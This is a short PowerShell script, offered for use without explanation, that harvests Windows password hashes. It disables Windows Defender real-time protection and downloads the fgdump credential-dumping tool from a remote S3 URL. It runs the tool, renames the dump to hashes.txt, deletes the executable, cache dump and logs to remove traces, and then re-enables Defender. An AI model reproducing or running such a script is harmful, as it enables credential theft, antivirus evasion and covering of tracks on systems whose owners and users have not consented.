#Disable Windows defender
Set-MpPreference -DisableRealtimeMonitoring $true

#Download fgdump
$url = "https://s3.amazonaws.com/mellondefender.tools/fgdump.exe"
$output = "$PSScriptRoot\fgdump.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output

#Extract downloaded file
#Expand-Archive $PSScriptRoot\fgdump.zip -DestinationPath $PSScriptRoot\fgdump

$exeloc = "$PSScriptRoot\fgdump.exe"

#Run pwdump7, pipe output in same path as script
start-process $exeloc

Start-Sleep -s 5

$hang = Get-process -Name "fgdump" -ErrorAction SilentlyContinue
if ($hang) {
$hang.closeMainWindow()
Start-Sleep -s 3
if (!$hang.HasExited) {
    $hang | Stop-Process -Force
  }
}

Rename-Item -Path "$PSScriptRoot\127.0.0.1.pwdump" -NewName "hashes.txt"

$FileName = "$PSScriptRoot\127.0.0.1.cachedump"
if (Test-Path $FileName) 
{
  Remove-Item $FileName
}

$FileName = "$PSScriptRoot\fgdump.exe"
if (Test-Path $FileName) 
{
  Remove-Item $FileName
}

ls *.fgdump-log -Recurse | foreach {rm $_} 

#Enable Windows defender
Set-MpPreference -DisableRealtimeMonitoring $false